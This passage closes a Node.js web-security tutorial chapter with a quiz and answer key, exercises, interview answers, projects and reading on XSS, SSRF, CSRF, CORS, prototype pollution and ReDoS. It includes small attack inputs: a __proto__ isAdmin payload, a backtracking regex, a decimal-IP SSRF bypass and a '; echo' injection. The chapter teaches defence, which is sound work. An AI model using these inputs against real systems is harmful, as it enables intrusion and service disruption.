+<li><strong>Headers, limits, secrets hygiene, patching</strong>: the cheap measures that stop most real attacks.</li>
+</ol>
+<hr>
+
+<h2 id="23-23-20-multiple-choice-questions">23.23 20 Multiple Choice Questions</h2>
+<div class="quiz" data-quiz>
+<p class="quiz-intro">Tap an answer to check it. Your score updates as you go.</p>
+<p class="quiz-score" aria-live="polite">Score: 0 / 0 answered (20 questions)</p>
+<ol class="quiz-list">
+<li class="quiz-q" data-answer="b" data-why="Data as code."><p class="quiz-text">The fundamental cause behind injection attacks is:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Weak passwords</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Untrusted data being interpreted as code/commands</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">Slow servers</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Missing indexes</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Encode output."><p class="quiz-text">The primary XSS defence is:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Input length limits</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Context-aware output encoding (plus CSP as a backup)</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">HTTPS</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Rate limiting</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="JS can't read it."><p class="quiz-text"><code>HttpOnly</code> on a session cookie:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Prevents XSS</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Stops JavaScript from reading the cookie</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">Prevents CSRF</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Encrypts it</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Normalises outside base."><p class="quiz-text"><code>path.join(base, &#39;../secret.txt&#39;)</code> returns a path:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Inside base</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Outside base: containment must be checked after <code>resolve</code></span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">That throws</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Always <code>base</code></span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Sibling prefix trick."><p class="quiz-text">Why check <code>startsWith(pub + path.sep)</code> rather than <code>startsWith(pub)</code>?</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Style</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">A sibling like <code>public-evil</code> would pass the shorter check</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">Windows only</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Speed</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="No shell."><p class="quiz-text">The safe way to run an external program with user data:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t"><code>exec(\</code>cmd ${x}`)`</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t"><code>execFile(&#39;cmd&#39;, [x])</code> plus validation</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t"><code>eval</code></span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t"><code>sh -c</code></span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Privileged network position."><p class="quiz-text">SSRF is dangerous mainly because the server:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Is slow</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Can reach internal services and cloud metadata that outsiders can&#39;t</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">Uses HTTP</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Has no CORS</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Alternate encodings."><p class="quiz-text"><code>http://2130706433/</code> demonstrates that:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Decimal IPs are invalid</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">String blocklists miss alternate spellings of 127.0.0.1</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">DNS is slow</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Redirects are safe</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Layered."><p class="quiz-text">A robust SSRF defence combines:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Only a regex</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Allow-list + resolve-and-check IP + no auto-redirect + timeouts (+ egress filtering)</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">Blocking &quot;localhost&quot;</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">CORS</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Rebinding."><p class="quiz-text">The remaining SSRF risk after resolve-and-check is:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">None</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">DNS rebinding (time-of-check/time-of-use)</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">HTTPS</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Cookies</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Reflect + credentials."><p class="quiz-text">The CORS config <code>{ origin: true, credentials: true }</code> is dangerous because it:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Is slow</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Reflects any origin and allows credentials, letting any site read authenticated responses</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">Blocks all origins</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Disables cookies</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Browser reads only."><p class="quiz-text">CORS protects against:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t"><code>curl</code> requests</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Cross-origin <em>reads by browser JavaScript</em> only; not requests from non-browser clients</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">SQL injection</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">DDoS</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Ambient credentials."><p class="quiz-text">CSRF requires that the target endpoint authenticates via:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Bearer headers set by your JS</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Ambient credentials such as cookies</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">mTLS only</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">API keys in the body</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Token required."><p class="quiz-text">In the test, a forged request with a <em>spoofed good Origin</em> but no CSRF token:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Succeeded</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Was rejected with 403</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">Returned 500</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Redirected</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="HSTS."><p class="quiz-text">Which header tells browsers to use HTTPS only for a domain?</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">CSP</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">HSTS (<code>Strict-Transport-Security</code>)</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">CORS</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Referrer-Policy</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Prototype shared by all."><p class="quiz-text">Prototype pollution via <code>JSON.parse(&#39;{&quot;__proto__&quot;:{&quot;isAdmin&quot;:true}}&#39;)</code> plus a naive merge makes:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Only the merged object admin</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Every plain object appear to have <code>isAdmin</code></span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">Nothing</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">The process exit</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="a" data-why="Key filtering + schemas."><p class="quiz-text">Which is a fix for prototype pollution?</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">Skip <code>__proto__</code>/<code>constructor</code>/<code>prototype</code> keys, use strict schemas, <code>Object.create(null)</code></span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Use bigger objects</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t"><code>JSON.stringify</code> twice</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Minify</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Exponential backtracking."><p class="quiz-text"><code>/^(a+)+$/</code> is dangerous because:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">It&#39;s slow only for long strings</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Nested quantifiers cause exponential backtracking on non-matching input, blocking the event loop</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">It matches too much</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">It&#39;s invalid</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="2532 ms measured."><p class="quiz-text">In our test, an innocent request during a ReDoS took about:</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t">3 ms</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">2.5 s (blocked behind the regex)</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">Failed</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">100 ms</span></button></li></ul><p class="quiz-note" hidden></p></li>
+<li class="quiz-q" data-answer="b" data-why="Reproducible, audited installs."><p class="quiz-text">Which practice best addresses the supply-chain risk?</p><ul class="quiz-opts"><li><button type="button" class="quiz-opt" data-k="a"><span class="k">a</span><span class="t"><code>npm install latest</code> on deploy</span></button></li><li><button type="button" class="quiz-opt" data-k="b"><span class="k">b</span><span class="t">Commit the lockfile, use <code>npm ci</code>, run audits, review updates</span></button></li><li><button type="button" class="quiz-opt" data-k="c"><span class="k">c</span><span class="t">Delete node_modules</span></button></li><li><button type="button" class="quiz-opt" data-k="d"><span class="k">d</span><span class="t">Disable HTTPS</span></button></li></ul><p class="quiz-note" hidden></p></li>
+</ol>
+<details class="quiz-key"><summary>Show the answer key</summary><p>1-b, 2-b, 3-b, 4-b, 5-b, 6-b, 7-b, 8-b, 9-b, 10-b, 11-b, 12-b, 13-b, 14-b, 15-b, 16-b, 17-a, 18-b, 19-b, 20-b</p></details>
+</div>
+<h2 id="23-24-20-hands-on-exercises">23.24 20 Hands-on Exercises</h2>
+<p><em>(Use <a href="/learn/backend-master/resources/ch23/README.txt">resources/ch23/</a>; run only on localhost.)</em></p>
+<p><strong>Easy</strong></p>
+<ol>
+<li>Run the lab; capture each v1 vs v2 pair.</li>
+<li>Send an XSS payload to your own page and view the encoded output.</li>
+<li>Add <code>helmet()</code> to an app and compare headers with <code>curl -I</code> before/after.</li>
+<li>Show path traversal and fix it with <code>resolve</code> + prefix.</li>
+<li>Prove <code>exec</code> with concatenation is injectable using <code>; echo</code>.</li>
+</ol>
+<p><strong>Medium</strong></p>
+<ol start="6">
+<li>Write <code>isPrivate(ip)</code> covering IPv4, IPv6, mapped IPv4, CGNAT and link-local; unit-test 30 addresses.</li>
+<li>Add DNS pinning to <code>safeFetch</code> (use the validated IP for the connection) and explain what attack it stops.</li>
+<li>Implement CSRF tokens for a cookie-authenticated form app; test with and without tokens.</li>
+<li>Configure a strict CSP (nonces) for a small HTML app; then trigger violations and collect <code>report-to</code> reports.</li>
+<li>Write a recursive <code>set(obj, &#39;a.b.c&#39;, value)</code> utility; exploit it with <code>__proto__.x</code>; fix it.</li>
+<li>Find a ReDoS regex in an open-source project (via <code>safe-regex</code>) and demonstrate the slowdown.</li>
+<li>Add request/response size, time and depth limits to an Express app; verify each with a failing test.</li>
+</ol>
+<p><strong>Hard</strong></p>
+<ol start="13">
+<li>Build an SSRF-proof image-import service (allow-list + resolution + size/time limits + content sniffing) and attack it with redirects and rebinding.</li>
+<li>Replace the regexes in a form validator with <code>re2</code> or Zod; benchmark worst-case inputs.</li>
+<li>Implement safe file uploads: magic-byte validation, re-encoding, random names, separate domain; fuzz it.</li>
+<li>Add a CI job running <code>npm audit</code>, secret scanning, and an OWASP ZAP baseline scan against a staging build.</li>
+<li>Write Playwright tests asserting security headers and that an injected <code>&lt;script&gt;</code> does not execute under your CSP.</li>
+<li>Perform a threat model (STRIDE) of ShopLine checkout; list five abuse cases and the control for each.</li>
+<li>Implement a redaction layer for logs so passwords, tokens and card numbers never appear; test with canary values.</li>
+<li>Run a vulnerable training app (OWASP Juice Shop / DVWA, locally) and write up three exploits and their root-cause fixes.</li>
+</ol>
+<hr>
+
+<h2 id="23-25-5-interview-questions">23.25 5 Interview Questions</h2>
+<p><strong>1. Explain XSS and how you prevent it.</strong>
+<em>Model answer:</em> Attacker-controlled data rendered as HTML/JS in a victim&#39;s browser, running with the site&#39;s authority (stored, reflected, DOM). Prevent with contextual output encoding by default (auto-escaping templates/frameworks), sanitising any intentionally-allowed HTML with DOMPurify, a strict CSP, <code>HttpOnly</code> cookies, avoiding <code>innerHTML</code>/raw-HTML sinks, and not keeping tokens in <code>localStorage</code>.</p>
+<p><strong>2. What&#39;s the difference between CSRF and XSS, and how do you defend against CSRF?</strong>
+<em>Model answer:</em> XSS runs attacker script on your origin; CSRF makes the victim&#39;s browser send authenticated requests from the attacker&#39;s origin using ambient cookies. Defend with <code>SameSite</code> cookies, no state change on GET, Origin/Referer verification, and CSRF tokens (or avoid cookie auth for APIs). XSS defeats CSRF protections, so it must be fixed too.</p>
+<p><strong>3. What is SSRF and how would you defend against it?</strong>
+<em>Model answer:</em> The server is induced to make requests to attacker-chosen URLs, reaching internal services or cloud metadata. Defend with allow-listed hosts, resolving DNS and rejecting private/loopback/link-local addresses (not string blocklists), refusing redirects, timeouts and size limits, DNS pinning against rebinding, egress network controls and IMDSv2.</p>
+<p><strong>4. What does CORS do, and what mistakes do people make?</strong>
+<em>Model answer:</em> It lets a server relax the browser&#39;s same-origin policy by declaring which origins&#39; scripts may read its responses; it&#39;s not authentication and doesn&#39;t affect non-browser clients. Mistakes: reflecting any origin with credentials, <code>*</code> with credentials (rejected), allowing <code>null</code>, treating CORS as an access control, and forgetting <code>Vary: Origin</code>.</p>
+<p><strong>5. How can a single request take down a Node.js server?</strong>
+<em>Model answer:</em> Node&#39;s single thread means any long synchronous operation blocks everyone: ReDoS from nested-quantifier regexes, huge <code>JSON.parse</code> or sorts, synchronous crypto, giant payloads. Mitigate with input length caps, safe/linear-time regexes (RE2), body size limits, worker threads for CPU work, timeouts, and rate limiting. Our test: a 28-character input stalled the loop for ~2.5 s and delayed an innocent request.</p>
+<hr>
+
+<h2 id="23-26-3-real-projects">23.26 3 Real Projects</h2>
+<p><strong>Project 1: Security Hardening Sprint (intermediate, ~10 hours).</strong>
+Take ShopLine&#39;s API and apply this chapter&#39;s controls (Helmet/CSP, CORS allow-list, CSRF, body/time limits, SSRF-safe fetch, safe regexes, strict schemas). Add an automated &quot;attack suite&quot; that replays each exploit from the lab and fails CI if any succeeds.</p>
+<p><strong>Project 2: SSRF-Safe Fetch Library (intermediate–advanced, ~10 hours).</strong>
+Publish a small library: URL parsing, allow-lists, DNS resolution with IP pinning, private-range detection, redirect policy, size/time limits, and a test corpus of tricky URLs (decimal, octal, IPv6-mapped, userinfo <code>@</code>, unicode dots, rebinding simulator).</p>
+<p><strong>Project 3: Pen-Test Report (intermediate, ~12 hours).</strong>
+Using a deliberately vulnerable app (Juice Shop/DVWA/crAPI) <em>in your own sandbox</em>, find and exploit ten issues across XSS, injection, access control and misconfiguration; write a professional report (impact, reproduction steps, fixes, CVSS-style severity) and fix the corresponding code in a forked copy.</p>
+<hr>
+
+<h2 id="23-27-further-reading">23.27 Further Reading</h2>
+<ul>
+<li><strong>OWASP</strong>: Top 10 (2021), API Security Top 10 (2023), ASVS, and the <strong>Cheat Sheet Series</strong> (XSS Prevention, CSRF, SSRF, Content Security Policy, Prototype Pollution Prevention, REST Security, Node.js Security).</li>
+<li>PortSwigger <strong>Web Security Academy</strong>: free labs for every topic here.</li>
+<li>MDN: <em>Same-origin policy</em>, <em>CORS</em>, <em>Content Security Policy</em>, <em>Set-Cookie (SameSite)</em>, <em>Strict-Transport-Security</em>.</li>
+<li>Helmet and Node.js security best-practices documentation; <strong>Node.js Security Working Group</strong> advisories.</li>
+<li>Papers/write-ups: Capital One breach analyses (SSRF + IMDS), &quot;Prototype pollution attacks in Node.js&quot; (Arteau et al.), Cloudflare&#39;s ReDoS post-mortem (2019).</li>
+<li><em>The Web Application Hacker&#39;s Handbook</em> and <em>Real-World Bug Hunting</em>.</li>
+</ul>
+<hr>
+<h3 id="up-next-chapter-24-testing-strategy">Up next → Chapter 24: Testing Strategy</h3>
+<p>You&#39;ve now attacked your own code by hand. Next: make those checks automatic and permanent. The testing pyramid, unit tests with Node&#39;s built-in runner and Vitest, integration tests with real PostgreSQL and Redis, HTTP-level API tests, contract tests, mocking (and when <em>not</em> to), test data and fixtures, flaky tests, coverage, mutation testing, load testing, and wiring it all into CI, applied to the ShopLine modules you&#39;ve built.</p>
+
+<section class="learn-faq" aria-labelledby="faq-title">
+<h2 id="faq-title">Web: frequently asked questions</h2>
+<details class="learn-faq-item"><summary><h3>Does CORS protect my API?</h3></summary><p>No. CORS only controls whether a browser lets page JavaScript read a cross-origin response. curl and attackers ignore it, so you still need authentication and authorization.</p></details>
+<details class="learn-faq-item"><summary><h3>How do I prevent SSRF?</h3></summary><p>Allow-list destinations, resolve DNS and block private, loopback and link-local addresses, do not follow redirects automatically, set timeouts and restrict egress at the network level.</p></details>
+<details class="learn-faq-item"><summary><h3>What is the difference between XSS and CSRF?</h3></summary><p>XSS runs attacker script on your site. CSRF makes a victim's browser send authenticated requests from the attacker's site using cookies. Fix XSS first, because it defeats CSRF defences.</p></details>
+<details class="learn-faq-item"><summary><h3>What is ReDoS?</h3></summary><p>A regular expression with nested quantifiers can take exponential time on crafted input and, because Node is single-threaded, freeze the whole server. Cap input length and avoid nested quantifiers.</p></details>
+</section>
+                        <aside class="learn-author">
+                            <p><strong>Written by <a href="/#about">Shivam Thakur</a></strong>, a full stack developer based in Agra, India. Backend Master is free to read. If you are hiring or need something built, <a href="/contact">get in touch</a>.</p>
+                        </aside>
+                    <nav class="learn-pager" id="learnPager" aria-label="Chapter navigation">
+                        <a class="prev" rel="prev" href="/learn/backend-master/authorization-rbac-idor-row-level-security"><span>&larr; Previous &middot; Chapter 22</span><strong>Authorization: RBAC, IDOR &amp; RLS</strong></a>
+                        <a class="next" rel="next" href="/learn/backend-master/backend-testing-strategy-node-test-integration-property"><span>Next &middot; Chapter 24 &rarr;</span><strong>Backend Testing Strategy: Node.js Guide</strong></a>
+                    </nav>
+                    </article>
+                  </div>
+                </div>
+
+                <details class="learn-toc" id="learnToc" open>
+                    <summary>On this page</summary>
+                    <nav aria-label="On this page"><ul><li><a href="#23-0-why-this-chapter-matters">23.0 Why This Chapter Matters</a></li><li><a href="#23-1-the-mindset-never-trust-input-never-trust-the-network-never-trust-yourself">23.1 The Mindset: Never Trust Input, Never Trust the Network, Never Trust Yourself</a></li><li><a href="#23-2-cross-site-scripting-xss">23.2 Cross-Site Scripting (XSS)</a></li><li><a href="#23-3-path-traversal">23.3 Path Traversal</a></li><li><a href="#23-4-command-injection">23.4 Command Injection</a></li><li><a href="#23-5-server-side-request-forgery-ssrf">23.5 Server-Side Request Forgery (SSRF)</a></li><li><a href="#23-6-open-redirects">23.6 Open Redirects</a></li><li><a href="#23-7-cors-what-it-is-and-what-it-isn-t">23.7 CORS: What It Is, and What It Isn't</a></li><li><a href="#23-8-cross-site-request-forgery-csrf">23.8 Cross-Site Request Forgery (CSRF)</a></li><li><a href="#23-9-security-headers-and-helmet">23.9 Security Headers and Helmet</a></li><li><a href="#23-10-prototype-pollution">23.10 Prototype Pollution</a></li><li><a href="#23-11-denial-of-service-regular-expressions-and-resource-limits">23.11 Denial of Service: Regular Expressions and Resource Limits</a></li><li><a href="#23-12-injection-recapped">23.12 Injection, Recapped</a></li><li><a href="#23-13-file-uploads-described-not-run-in-this-chapter">23.13 File Uploads (Described; not run in this chapter)</a></li><li><a href="#23-14-secrets-dependencies-and-supply-chain">23.14 Secrets, Dependencies and Supply Chain</a></li><li><a href="#23-15-logging-errors-and-monitoring-for-security">23.15 Logging, Errors and Monitoring for Security</a></li><li><a href="#23-16-owasp-top-10-map-2021-to-this-book">23.16 OWASP Top 10 Map (2021) to This Book</a></li><li><a href="#23-17-edge-cases-and-gotchas-checklist">23.17 Edge Cases and Gotchas Checklist</a></li><li><a href="#23-18-chapter-summary">23.18 Chapter Summary</a></li><li><a href="#23-19-revision-notes">23.19 Revision Notes</a></li><li><a href="#23-20-mind-map-ascii">23.20 Mind Map (ASCII)</a></li><li><a href="#23-21-cheat-sheet">23.21 Cheat Sheet</a></li><li><a href="#23-22-key-takeaways">23.22 Key Takeaways</a></li><li><a href="#23-23-20-multiple-choice-questions">23.23 20 Multiple Choice Questions</a></li><li><a href="#23-24-20-hands-on-exercises">23.24 20 Hands-on Exercises</a></li><li><a href="#23-25-5-interview-questions">23.25 5 Interview Questions</a></li><li><a href="#23-26-3-real-projects">23.26 3 Real Projects</a></li><li><a href="#23-27-further-reading">23.27 Further Reading</a></li><li><a href="#faq-title">Frequently asked questions</a></li></ul></nav>
+                </details>
+            </div>
+        </div>
+        <!-- Footer -->
+        <footer id="footer" class="tf-footer flat-spacing spacing-tight">
+            <div class="br-line"></div>
+            <div class="foot-dark">
+                <div class="foot-top">
+                    <a href="/" class="f-logo-link" aria-label="Shivam Thakur home">
+                        <img loading="lazy" width="30" height="30" src="../../assets/images/logo/logo-s-w.svg" alt="Shivam Thakur logo"><span class="f-logo-name" aria-hidden="true">Shivam Thakur</span></a>
+                    <ul class="build-social-list foot-socials">
+                        <li><a href="https://github.com/ShivamThakurXcode/" target="_blank" rel="noopener" aria-label="GitHub profile"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504c.5.092.682-.217.682-.483c0-.237-.008-.868-.013-1.703c-2.782.605-3.369-1.343-3.369-1.343c-.454-1.158-1.11-1.466-1.11-1.466c-.908-.62.069-.608.069-.608c1.003.07 1.531 1.032 1.531 1.032c.892 1.53 2.341 1.088 2.91.832c.092-.647.35-1.088.636-1.338c-2.22-.253-4.555-1.113-4.555-4.951c0-1.093.39-1.988 1.029-2.688c-.103-.253-.446-1.272.098-2.65c0 0 .84-.27 2.75 1.026A9.6 9.6 0 0 1 12 6.844c.85.004 1.705.115 2.504.337c1.909-1.296 2.747-1.027 2.747-1.027c.546 1.379.203 2.398.1 2.651c.64.7 1.028 1.595 1.028 2.688c0 3.848-2.339 4.695-4.566 4.943c.359.309.678.919.678 1.852c0 1.336-.012 2.415-.012 2.743c0 .268.18.58.688.482A10.02 10.02 0 0 0 22 12.017C22 6.484 17.522 2 12 2"/></svg></a></li>
+                        <li><a href="https://www.linkedin.com/in/shivam-thakur-9b1a54311/" target="_blank" rel="noopener" aria-label="LinkedIn profile"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M19 3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm-.5 15.5v-5.3a3.26 3.26 0 0 0-3.26-3.26c-.85 0-1.84.52-2.32 1.3v-1.11h-2.79v8.37h2.79v-4.93c0-.77.62-1.4 1.39-1.4a1.4 1.4 0 0 1 1.4 1.4v4.93zM6.88 8.56a1.68 1.68 0 0 0 1.68-1.68c0-.93-.75-1.69-1.68-1.69a1.69 1.69 0 0 0-1.69 1.69c0 .92.76 1.68 1.69 1.68m1.39 9.94v-8.37H5.5v8.37z"/></svg></a></li>
+                        <li><a href="https://www.instagram.com/shivamthakur.dev" target="_blank" rel="noopener" aria-label="Instagram profile"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M7.8 2h8.4C19.4 2 22 4.6 22 7.8v8.4a5.8 5.8 0 0 1-5.8 5.8H7.8C4.6 22 2 19.4 2 16.2V7.8A5.8 5.8 0 0 1 7.8 2m-.2 2A3.6 3.6 0 0 0 4 7.6v8.8C4 18.39 5.61 20 7.6 20h8.8a3.6 3.6 0 0 0 3.6-3.6V7.6C20 5.61 18.39 4 16.4 4zm9.65 1.5a1.25 1.25 0 0 1 1.25 1.25A1.25 1.25 0 0 1 17.25 8A1.25 1.25 0 0 1 16 6.75a1.25 1.25 0 0 1 1.25-1.25M12 7a5 5 0 0 1 5 5a5 5 0 0 1-5 5a5 5 0 0 1-5-5a5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3a3 3 0 0 0 3 3a3 3 0 0 0 3-3a3 3 0 0 0-3-3"/></svg></a></li>
+                    </ul>
+                    <div class="foot-cta">
+                        <a href="../../contact" class="foot-btn foot-btn-outline">Hire me <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg></a>
+                        <a href="https://wa.me/918958394972" class="foot-btn foot-btn-wa" target="_blank" rel="noopener"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.45 1.32 4.95L2 22l5.25-1.38a9.87 9.87 0 0 0 4.79 1.22h.01c5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.82 9.82 0 0 0 12.04 2Zm0 18.13h-.01a8.2 8.2 0 0 1-4.19-1.15l-.3-.18-3.12.82.83-3.04-.2-.31a8.18 8.18 0 0 1-1.26-4.36c0-4.54 3.7-8.24 8.25-8.24a8.2 8.2 0 0 1 8.24 8.25c0 4.54-3.7 8.21-8.24 8.21Zm4.52-6.16c-.25-.12-1.47-.72-1.69-.81-.23-.08-.39-.12-.56.13-.16.24-.64.8-.78.97-.14.16-.29.18-.54.06-.25-.12-1.05-.39-1.99-1.23-.74-.66-1.23-1.47-1.38-1.72-.14-.25-.02-.38.11-.5.11-.11.25-.29.37-.43.13-.15.17-.25.25-.41.08-.17.04-.31-.02-.43-.06-.12-.56-1.34-.76-1.84-.2-.48-.41-.42-.56-.43h-.48c-.17 0-.43.06-.66.31-.23.25-.86.85-.86 2.07 0 1.22.89 2.4 1.01 2.56.12.17 1.75 2.67 4.23 3.74.59.26 1.05.41 1.41.52.59.19 1.13.16 1.56.1.48-.07 1.47-.6 1.67-1.18.21-.58.21-1.07.15-1.18-.06-.1-.23-.16-.48-.29Z"/></svg>Chat on WhatsApp</a>
+                    </div>
+                </div>
+
